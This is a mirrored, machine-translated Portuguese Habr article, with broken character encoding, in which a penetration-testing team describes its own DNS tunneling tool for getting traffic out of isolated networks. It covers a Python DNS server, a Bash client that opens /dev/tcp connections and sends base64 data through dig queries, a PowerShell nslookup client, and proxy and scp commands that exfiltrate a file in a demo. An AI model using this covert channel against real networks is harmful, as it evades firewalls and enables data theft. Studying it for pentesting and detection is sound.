<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üêè üíÉüèæ üßó Tr√°fego no final do t√∫nel ou DNS no pentest üë®üèª‚ÄçüöÄ üßúüèª üè≥Ô∏è‚Äçüåà</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Oi Nos projetos de teste de penetra√ß√£o, geralmente encontramos redes segmentadas por hardware que s√£o quase completamente isoladas do mundo externo. √Ä...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Tr√°fego no final do t√∫nel ou DNS no pentest</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  Oi  Nos projetos de teste de penetra√ß√£o, geralmente encontramos redes segmentadas por hardware que s√£o quase completamente isoladas do mundo externo.  √Äs vezes, para resolver esse problema, √© necess√°rio encaminhar o tr√°fego atrav√©s do √∫nico protocolo dispon√≠vel - DNS.  Neste artigo, mostraremos como resolver um problema semelhante em 2018 e quais s√£o as armadilhas encontradas no processo.  Os utilit√°rios populares tamb√©m ser√£o revisados ‚Äã‚Äãe um lan√ßamento de seu pr√≥prio utilit√°rio de c√≥digo-fonte aberto ser√° apresentado com recursos que geralmente n√£o existem nas ferramentas similares existentes. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  O que s√£o t√∫neis DNS </h1><br><p>  J√° existem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">v√°rios</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">artigos</a> sobre Habr√© que explicam o que √© um tunelamento de DNS.  No entanto, um pouco de teoria sobre o encapsulamento de DNS pode ser encontrado no spoiler. </p><br><div class="spoiler">  <b class="spoiler_title">O que √© o encapsulamento de DNS?</b> <div class="spoiler_text"><p>  Acontece que o acesso √† rede √© fortemente cortado pelo firewall, e voc√™ precisa transferir os dados muito mal e, em seguida, a t√©cnica de encapsulamento de DNS vem em socorro. </p><br><p>  No diagrama, tudo se parece com isso: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  As consultas para DNS, mesmo com as configura√ß√µes de firewall mais rigorosas, √†s vezes ainda s√£o aprovadas, e voc√™ pode us√°-las respondendo-as no servidor localizado no outro lado.  A comunica√ß√£o ser√° extremamente lenta, mas isso √© suficiente para penetrar na rede local da organiza√ß√£o ou, por exemplo, para acessar urgentemente a Internet via Wi-Fi pago no exterior. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  O que √© popular no momento </h1><br><p>  Agora, na Internet, voc√™ pode encontrar muitos utilit√°rios para operar essa t√©cnica - cada um com seus pr√≥prios recursos e bugs.  Selecionamos os cinco mais populares para testes comparativos: </p><br><ul><li>  dnscat2 </li><li>  iodo </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  Voc√™ pode ler mais sobre como os testamos em nosso artigo sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">Hacker</a> .  Aqui damos apenas os resultados. </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  Como voc√™ pode ver nos resultados, voc√™ pode trabalhar, mas do ponto de vista dos testes de penetra√ß√£o, existem desvantagens: </p><br><ul><li>  clientes compilados - em m√°quinas com antiv√≠rus, √© muito mais f√°cil executar algo interpretado do que um arquivo bin√°rio; </li><li>  trabalho inst√°vel no Windows; </li><li>  a necessidade de instalar software adicional em alguns casos. </li></ul><br><p>  Devido a essas defici√™ncias, precis√°vamos desenvolver nossa pr√≥pria ferramenta, e foi assim que ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  Crie seu pr√≥prio utilit√°rio de encapsulamento DNS </h1><br><h2 id="predystoriya">  Antecedentes </h2><br><p>  Tudo come√ßou durante o teste interno de um banco.  No sagu√£o havia um computador p√∫blico usado para imprimir documentos, certificados e outros pap√©is.  Nosso objetivo: obter o m√°ximo benef√≠cio de uma m√°quina executando o Windows 7, ter o Kaspersky Anti-Virus integrado e permitir o acesso a apenas determinadas p√°ginas (mas, ao mesmo tempo, era poss√≠vel resolver os nomes DNS). </p><br><p>  Ap√≥s realizar a an√°lise inicial e obter dados adicionais do carro, desenvolvemos v√°rios vetores de ataque.  Os caminhos com a opera√ß√£o da m√°quina usando programas bin√°rios foram imediatamente removidos para o lado, pois o "grande e terr√≠vel" "Kaspersky" detectou imediatamente o apagamento de um arquivo execut√°vel.  No entanto, conseguimos a oportunidade de executar scripts em nome do administrador local, ap√≥s o qual uma das id√©ias era apenas a possibilidade de criar um t√∫nel DNS. </p><br><p>  Procurando por m√©todos poss√≠veis, encontramos um cliente no PowerShell para dnscat2 (escrevemos sobre isso anteriormente).  Mas, no final, o m√°ximo que conseguimos produzir foi estabelecer uma conex√£o por um curto per√≠odo de tempo, ap√≥s o qual o cliente travou. </p><br><p>  Isso, para dizer o m√≠nimo, nos incomodou bastante, pois nessa situa√ß√£o a presen√ßa de um cliente interpretado era simplesmente necess√°ria.  Na verdade, esse foi um dos motivos para o desenvolvimento de nossa pr√≥pria ferramenta de encapsulamento de DNS. </p><br><h2 id="trebovaniya">  Exig√™ncias </h2><br><p>  Nossos principais requisitos para n√≥s mesmos s√£o: </p><br><ul><li>  a presen√ßa de clientes universais (na medida do poss√≠vel) e interpretados para sistemas Unix e Windows.  Para os clientes, bash e Powershell foram selecionados, respectivamente.  No futuro, um cliente Perl para unix est√° planejado; </li><li>  a capacidade de encaminhar tr√°fego de um aplicativo espec√≠fico; </li><li>  Suporte para v√°rios clientes para um usu√°rio. </li></ul><br><h2 id="arhitektura-proekta">  Arquitetura do projeto </h2><br><p>  Com base nos requisitos, iniciamos o desenvolvimento.  Em nossa opini√£o, o utilit√°rio consiste em 3 partes: um cliente na m√°quina interna, um servidor DNS e um pequeno proxy entre o aplicativo pentester e o servidor DNS. </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  Para come√ßar, decidimos encaminhar o t√∫nel atrav√©s dos registros TXT. </p><br><p>  O princ√≠pio de opera√ß√£o √© bastante simples: </p><br><ul><li>  Pentester lan√ßa um servidor DNS. </li><li>  Um pentester (ou usu√°rio, atrav√©s da engenharia social) executa um cliente em uma m√°quina interna.  No cliente, existem par√¢metros como o nome e o dom√≠nio do cliente, al√©m da possibilidade de especificar diretamente o endere√ßo IP do servidor DNS. </li><li> Um pentester (de uma rede externa) inicia um proxy, onde indica o endere√ßo IP do servidor DNS, bem como a porta onde bater, os destinos IP (por exemplo, ssh na rede interna onde o cliente est√° sentado) e, consequentemente, a porta de destino.  Tamb√©m √© necess√°rio um ID do cliente, que pode ser obtido adicionando a chave <code>--clients</code> . </li><li>  O Pentester inicia a aplica√ß√£o de seu interesse, apontando a porta proxy para o host local. </li></ul><br><h2 id="protokol-obscheniya">  Protocolo de comunica√ß√£o </h2><br><p>  Considere um protocolo bastante simples para comunica√ß√£o entre um servidor e um cliente. </p><br><h3 id="registraciya">  Registo </h3><br><p>  Quando o cliente inicia, ele se registra no servidor, solicitando um registro TXT atrav√©s de um subdom√≠nio do seguinte formato: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - chave de registro <br>  <code>&lt;7 random chars&gt;</code> - para evitar o cache de registros DNS <br>  <code>&lt;client name&gt;</code> - o nome dado ao cliente na inicializa√ß√£o <br>  <code>&lt;your domain&gt;</code> - por exemplo: xakep.ru <br>  Em caso de registro bem-sucedido, o cliente recebe uma mensagem de sucesso na resposta TXT, bem como o ID atribu√≠do a ele, que ele continuar√° usando. </p><br><h3 id="osnovnoy-cikl">  Ciclo principal </h3><br><p>  Ap√≥s o registro, o cliente come√ßa a consultar o servidor sobre a disponibilidade de novos dados no formato </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  Se houver novos dados, na resposta TXT, eles ser√£o recebidos no formato </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , caso contr√°rio, o <code>&lt;id&gt;ND</code> √© fornecido. </p><br><h3 id="cikl-zagruzki-dannyh">  Ciclo de carregamento de dados </h3><br><p>  O cliente em um loop verifica se os dados vieram do nosso <code>&lt;target&gt;</code> .  Se houver uma resposta, lemos, do que chegou, um buffer de tamanho N Kb, divida-o em blocos de <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> e envie dados bloco por bloco no formato: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  Se a transfer√™ncia do bloco for bem-sucedida, ficaremos OK com alguns dados sobre o bloco transferido; no caso da conclus√£o da transfer√™ncia do buffer, obteremos <code>ENDBLOCK</code> . </p><br><h2 id="dns-server">  Servidor DNS </h2><br><p>  O servidor DNS de encapsulamento foi escrito em Python3 usando a biblioteca dnslib, o que facilita a cria√ß√£o de seu pr√≥prio resolvedor DNS herdando o objeto dnslib.ProxyResolver e substituindo o m√©todo resolve (). </p><br><p>  O excelente dnslib permite que voc√™ crie seu pr√≥prio proxyDNS muito rapidamente: </p><br><div class="spoiler">  <b class="spoiler_title">Um pouco de c√≥digo do servidor</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  Em resolve (), definimos as respostas √†s consultas DNS do cliente: registro, solicita√ß√£o de novos registros, dados de postagem e exclus√£o do usu√°rio. </p><br><p>  Armazenamos informa√ß√µes sobre os usu√°rios no banco de dados SQLite, a √°rea de transfer√™ncia de dados est√° localizada na RAM e possui a seguinte estrutura, na qual a chave √© o n√∫mero do cliente: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP ‚Äú‚Äù -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  ‚Äú‚Äù <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  Para colocar os dados do pentester no buffer, escrevemos um pequeno "receptor", que √© iniciado em um fluxo separado.  Ele captura conex√µes do pentester e executa o roteamento: para qual cliente enviar solicita√ß√µes. </p><br><p>  Antes de iniciar o servidor, o usu√°rio precisa definir apenas um par√¢metro: DOMAIN_NAME - o nome do dom√≠nio com o qual o servidor funcionar√°. </p><br><h2 id="klient-na-bash">  Bash Client </h2><br><p>  O Bash foi escolhido para escrever um cliente para sistemas Unix, como costuma ser encontrado em sistemas Unix modernos.  O Bash oferece a capacidade de conectar-se atrav√©s de / dev / tcp /, mesmo com direitos de usu√°rio n√£o privilegiados. </p><br><p>  N√£o analisaremos cada peda√ßo de c√≥digo em detalhes, apenas daremos uma olhada nos pontos mais interessantes. <br>  O princ√≠pio do cliente √© simples.  Para se comunicar com o DNS, o utilit√°rio <code>dig</code> padr√£o √© usado.  O cliente se registra no servidor, ap√≥s o qual, no ciclo perp√©tuo, come√ßa a atender solicita√ß√µes usando o protocolo descrito anteriormente.  Sob o spoiler mais. </p><br><div class="spoiler">  <b class="spoiler_title">Leia mais sobre o cliente Bash</b> <div class="spoiler_text"><p>  Uma verifica√ß√£o est√° em andamento para determinar se uma conex√£o foi estabelecida e, em caso afirmativo, a fun√ß√£o de resposta √© executada (lendo os dados recebidos do destino, dividindo e enviando para o servidor). </p><br><p>  Depois disso, √© verificado se h√° novos dados do servidor.  Se forem encontrados, verificamos se a conex√£o deve ser interrompida.  A diferen√ßa ocorre quando recebemos informa√ß√µes sobre o destino com ip 0.0.0.0 e porta 00. Nesse caso, limpamos o descritor de arquivo (se n√£o estiver aberto, n√£o haver√° problemas) e alteramos o destino do ip para o 0.0.0.0 recebido. </p><br><p>  Mais adiante, verificamos se √© necess√°rio estabelecer uma nova conex√£o.  Assim que as seguintes mensagens come√ßarem a nos enviar dados para o destino, n√≥s, caso o ip anterior n√£o corresponda ao atual (ser√° assim ap√≥s a redefini√ß√£o), alteramos o destino para um novo e estabelecemos uma conex√£o atrav√©s do comando <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , onde <code>$ip</code> √© o destino, <code>$port</code> √© a porta de destino. <br>  Como resultado, se a conex√£o j√° estiver estabelecida, os dados recebidos ser√£o decodificados e voar√£o para o descritor por meio do comando <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , onde <code>${data_array[2]}</code> √© o que obtemos do servidor. </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  Agora considere o envio da fun√ß√£o de resposta.  Primeiro, lemos 2048 bytes do descritor e os codificamos imediatamente atrav√©s de <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  Ent√£o, se a resposta estiver vazia, sairemos da fun√ß√£o, caso contr√°rio, iniciaremos a opera√ß√£o de divis√£o e envio.  Observe que ap√≥s a forma√ß√£o da solicita√ß√£o de envio via dig, a entrega √© verificada com √™xito.  Se for bem-sucedido, saia do ciclo ou tente at√© que ele funcione. </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  Cliente Powershell: </h2><br><p>  Como precis√°vamos de interpretabilidade total e trabalhamos na maioria dos sistemas atuais, o cliente base para Windows √© o utilit√°rio nslookup padr√£o para comunica√ß√£o via DNS e o objeto System.Net.Sockets.TcpClient para estabelecer uma conex√£o na rede interna. </p><br><p>  Tudo tamb√©m √© muito simples.  Cada itera√ß√£o do loop √© uma chamada ao comando nslookup usando o protocolo descrito anteriormente. </p><br><p>  Por exemplo, para registrar, execute o comando: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  Se ocorrerem erros, n√£o os mostramos, enviando os valores do descritor de erro para $ null. </p><br><p>  O nslookup nos retorna uma resposta semelhante: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  Depois disso, precisamos esticar todas as linhas entre aspas, pelas quais passamos por elas com uma temporada regular: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  Agora voc√™ pode processar os comandos recebidos. <br>  Sempre que o endere√ßo IP da ‚Äúv√≠tima‚Äù √© alterado, um cliente TCP √© criado, uma conex√£o √© estabelecida e a transfer√™ncia de dados √© iniciada.  No servidor DNS, as informa√ß√µes s√£o decodificadas em base64 e os bytes s√£o enviados para a v√≠tima.  Se a ‚Äúv√≠tima‚Äù respondeu alguma coisa, ent√£o codificamos, dividimos em partes e executamos solicita√ß√µes de pesquisa de acordo com o protocolo.  S√≥ isso. <br>  Quando voc√™ pressiona Ctrl + C, uma solicita√ß√£o para excluir o cliente √© executada. </p><br><h2 id="proxy">  Proxy: </h2><br><p>  O proxy para o pentester √© um pequeno servidor proxy em python3. </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  Nos par√¢metros que voc√™ precisa especificar o IP do servidor DNS, a porta na qual se conectar ao servidor, a op√ß√£o --clients retorna uma lista de clientes registrados, <code>--target - target ip</code> , <code>--target_port - target port</code> <code>--target - target ip</code> , <code>--target_port - target port</code> , <code>--client</code> - id do cliente com o qual iremos trabalho (visto ap√≥s a execu√ß√£o de <code>--clients</code> ), - <code>--send_timeout</code> - timeout para enviar mensagens do aplicativo. </p><br><p>  Quando iniciado com o par√¢metro <code>--clients</code> , o proxy envia uma solicita√ß√£o ao servidor no formato <code>\x00GETCLIENTS\n</code> . <br>  No caso em que come√ßamos o trabalho, ao conectar, enviamos uma mensagem no formato <code>\x02RESET:client_id\n</code> para redefinir a conex√£o anterior.  Depois de enviarmos informa√ß√µes sobre nosso destino: <code>\x01client_id:ip:port:\n</code> <br>  Al√©m disso, ao enviar mensagens para o cliente, enviamos bytes no formato <code>\x03data</code> e simplesmente enviamos bytes brutos para o aplicativo. <br>  Al√©m disso, o proxy suporta o modo SOCKS5. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  Que dificuldades podem surgir? </h2><br><p>  Como em qualquer mecanismo, o utilit√°rio pode falhar.  N√£o devemos esquecer que o t√∫nel DNS √© uma coisa fina e muitos fatores podem influenciar sua opera√ß√£o, desde a arquitetura da rede at√© a qualidade da conex√£o com o servidor de produ√ß√£o. </p><br><p>  Durante o teste, ocasionalmente observamos pequenas falhas.  Por exemplo, em altas velocidades de impress√£o, trabalhando com ssh, vale a pena definir o par√¢metro <code>--send_timeout</code> , pois caso contr√°rio, o cliente come√ßar√° a congelar.  Al√©m disso, √†s vezes a conex√£o pode n√£o ser estabelecida na primeira vez, mas pode ser facilmente tratada reiniciando o proxy, pois a conex√£o ser√° redefinida durante a nova conex√£o.  Tamb√©m houve problemas com a resolu√ß√£o do dom√≠nio ao trabalhar com proxychains, mas isso tamb√©m √© corrig√≠vel se voc√™ especificar um par√¢metro adicional para proxychains.  √â importante notar que, no momento, o utilit√°rio n√£o controla a apar√™ncia de solicita√ß√µes desnecess√°rias dos servidores DNS em cache, portanto, a conex√£o pode falhar algumas vezes; no entanto, isso √© tratado novamente usando o m√©todo descrito acima. </p><br><h2 id="zapusk">  Lan√ßamento </h2><br><p>  Configure registros NS no dom√≠nio: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  Aguardamos at√© que o cache seja atualizado (geralmente at√© 5 horas). </p><br><p>  Iniciamos o servidor: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  Inicie o cliente (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  Iniciamos o cliente (Win): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  Vamos ver a lista de clientes conectados: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  Inicie o proxy: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  Teste: </p><br><p>  Depois que o servidor e pelo menos um cliente foram iniciados, podemos acessar o proxy como se fosse nossa m√°quina remota. <br>  Vamos tentar simular a seguinte situa√ß√£o: o pentester deseja baixar um arquivo do servidor da rede local da organiza√ß√£o protegida pelo firewall, enquanto usava m√©todos de engenharia social, ele conseguiu for√ßar o cliente DNS a executar dentro da rede e descobrir a senha do servidor SSH. </p><br><p>  O Pentester em sua m√°quina inicia um proxy, indicando o cliente necess√°rio e pode fazer chamadas semelhantes que ser√£o enviadas ao cliente e do cliente para a rede local. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  Vamos ver o que aconteceu: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  No canto superior esquerdo, voc√™ pode ver as consultas DNS que chegam ao servidor, do canto superior direito - tr√°fego proxy, do canto inferior esquerdo - tr√°fego do cliente e do canto inferior direito - nosso aplicativo.  A velocidade ficou bastante decente para o t√∫nel DNS: 4.9Kb / s usando compacta√ß√£o. </p><br><p>  Quando lan√ßado sem compacta√ß√£o, o utilit√°rio mostrou uma velocidade de 1,8 kb / s: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  Vamos examinar atentamente o tr√°fego do servidor DNS, para isso usamos o utilit√°rio tcpdump. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  Vemos que tudo est√° de acordo com o protocolo descrito: o cliente consulta constantemente o servidor se possui novos dados para esse cliente usando solicita√ß√µes no formato <code>1c6Zx9Vi39.oversec.ru</code> .  Se houver dados, o servidor responder√° com um conjunto de registros TXT, caso contr√°rio,% client_num% ND ( <code>39ND</code> ).  O cliente envia informa√ß√µes para o servidor usando os tipos de consultas <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  Nos v√≠deos a seguir, voc√™ pode ver claramente como o utilit√°rio funciona em conjunto com o meterpreter e no modo SOCKS5. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  O resultado: </h2><br><p>  Vamos resumir um pouco.  Quais recursos esse desenvolvimento possui e por que recomendamos us√°-lo? </p><br><ol><li>  Clientes interpretados no Bash e no Powershell: nenhum EXE-shnikov e ELF-s que podem ser dif√≠ceis de executar. </li><li>  Estabilidade da conex√£o: nos testes, nosso utilit√°rio se comportou muito mais est√°vel e, se houver algum erro, voc√™ poder√° reconectar, enquanto o cliente n√£o travar, como foi o caso do dnscat2, por exemplo. </li><li>  Alta velocidade para o t√∫nel DNS: √© claro que a velocidade n√£o atinge o iodo, mas existe uma solu√ß√£o compilada de n√≠vel muito mais baixo. </li><li>  N√£o s√£o necess√°rios direitos de administrador: o cliente Bash funciona sem direitos de administrador e, √†s vezes, os scripts do Powershell s√£o proibidos pelas pol√≠ticas de seguran√ßa, mas isso √© bastante simples. </li><li>  Existe um modo proxy socks5, que permite fazer <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> ou executar o nmap em toda a rede interna. </li></ol><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">O c√≥digo do utilit√°rio est√° dispon√≠vel aqui.</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt432078/">https://habr.com/ru/post/pt432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt432068/index.html">Como facilitar o estudo do ingl√™s: 5 servi√ßos √∫teis</a></li>
<li><a href="../pt432070/index.html">Brevemente sobre canais redux-saga</a></li>
<li><a href="../pt432072/index.html">Tr√™s tipos de vazamentos de mem√≥ria</a></li>
<li><a href="../pt432074/index.html">Como os jogadores rasgam o pano de realidade Spelunky com espingardas</a></li>
<li><a href="../pt432076/index.html">Fun√ß√£o n√£o reconhecida retarda o programa 5 vezes</a></li>
<li><a href="../pt432080/index.html">Conceitos equivocados dos jogadores ao avaliar riscos. Controle do gerador de n√∫meros aleat√≥rios em desenvolvimento</a></li>
